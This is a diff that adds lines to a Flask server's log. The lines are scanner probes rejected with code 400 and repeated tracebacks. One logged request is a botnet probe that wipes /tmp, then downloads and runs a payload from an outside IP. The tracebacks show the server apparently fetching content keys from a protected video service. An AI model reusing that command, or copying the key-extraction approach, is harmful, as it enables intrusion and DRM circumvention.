@@ -813,3 +813,112 @@ b'{"code":2074,"message":"Please update app from Play Store","isErrorRecoverable
 b'{"code":2074,"message":"Please update app from Play Store","isErrorRecoverable":true}'
 205.210.31.220 - - [26/Nov/2024 06:14:06] code 400, message Bad request version ('b\x9bÛn!ø¢Æð\x9b\x7f7')
 205.210.31.220 - - [26/Nov/2024 06:14:07] code 400, message Bad request version ('À(À$À\x14À')
+78.153.140.224 - - [26/Nov/2024 06:21:18] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03\xad\x19à\x7f]\x18¥Ù\x02\x19\x88=\x9dHý,àM]~\x04Ý\x9a')
+152.42.243.206 - - [26/Nov/2024 08:02:50] code 400, message Bad request version ('À\x13À')
+152.42.214.140 - - [26/Nov/2024 08:02:53] code 400, message Bad request version ('À\x13À')
+64.62.156.15 - - [26/Nov/2024 09:58:34] code 400, message Bad request version ('À\x14À')
+66.240.205.34 - - [26/Nov/2024 10:57:58] code 400, message Bad request version ('ô')
+66.240.205.34 - - [26/Nov/2024 14:04:49] code 400, message Bad request version ('®¯]')
+104.236.3.45 - - [26/Nov/2024 14:19:16] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 944, in ink
+    c_keys , mpd = getkeys_ink(token , xotp , ins)
+  File "/root/spysnet/website/vdo.py", line 856, in getkeys_ink
+    mpd = get_mpd_ink(token , xotp)
+  File "/root/spysnet/website/vdo.py", line 833, in get_mpd_ink
+    req.raise_for_status()  # Raise an exception if the request fails
+  File "/usr/local/lib/python3.10/dist-packages/requests/models.py", line 1024, in raise_for_status
+    raise HTTPError(http_error_msg, response=self)
+requests.exceptions.HTTPError: 403 Client Error: Forbidden for url: https://api.inkryptvideos.com/api/s1/v_info/6acf3c7ac0b3467ab31569d0865a1b5a
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 944, in ink
+    c_keys , mpd = getkeys_ink(token , xotp , ins)
+  File "/root/spysnet/website/vdo.py", line 856, in getkeys_ink
+    mpd = get_mpd_ink(token , xotp)
+  File "/root/spysnet/website/vdo.py", line 833, in get_mpd_ink
+    req.raise_for_status()  # Raise an exception if the request fails
+  File "/usr/local/lib/python3.10/dist-packages/requests/models.py", line 1024, in raise_for_status
+    raise HTTPError(http_error_msg, response=self)
+requests.exceptions.HTTPError: 403 Client Error: Forbidden for url: https://api.inkryptvideos.com/api/s1/v_info/6acf3c7ac0b3467ab31569d0865a1b5a
+205.210.31.139 - - [26/Nov/2024 16:02:44] code 400, message Bad request version ('À\x13À')
+205.210.31.139 - - [26/Nov/2024 16:02:44] code 400, message Bad request version ('À(À$À\x14À')
+159.223.67.34 - - [26/Nov/2024 16:03:07] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01')
+80.66.76.121 - - [26/Nov/2024 17:08:34] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.100.87.136 - - [26/Nov/2024 18:20:33] code 400, message Bad HTTP/0.9 request type ('\x83F\x02\x00\x15\x00\x00\x00R%}gI\\m')
+5.8.11.202 - - [26/Nov/2024 19:07:04] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+178.128.54.126 - - [27/Nov/2024 00:03:10] code 400, message Bad request version ('ÅËÊ-\\ý\x8a')
+159.223.69.51 - - [27/Nov/2024 00:03:17] code 400, message Bad request version ('\x98Ä\x7fþ8\x8bR\x06,#\x82hL')
+146.190.241.67 - - [27/Nov/2024 00:08:39] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8;g')
+93.174.93.12 - - [27/Nov/2024 00:17:00] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 74, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask_cors/extension.py", line 194, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/root/spysnet/website/vdo.py", line 944, in ink
+    c_keys , mpd = getkeys_ink(token , xotp , ins)
+  File "/root/spysnet/website/vdo.py", line 856, in getkeys_ink
+    mpd = get_mpd_ink(token , xotp)
+  File "/root/spysnet/website/vdo.py", line 833, in get_mpd_ink
+    req.raise_for_status()  # Raise an exception if the request fails
+  File "/usr/local/lib/python3.10/dist-packages/requests/models.py", line 1024, in raise_for_status
+    raise HTTPError(http_error_msg, response=self)
+requests.exceptions.HTTPError: 403 Client Error: Forbidden for url: https://api.inkryptvideos.com/api/s1/v_info/e165b91a2d274852b6ffddc1da67f58f
+172.105.128.13 - - [27/Nov/2024 02:42:39] code 400, message Bad request version ('À\x13À')
+94.156.166.117 - - [27/Nov/2024 02:47:02] code 400, message Bad request syntax ('\x04\x01\x01»Ô/ú\x0e\x00')
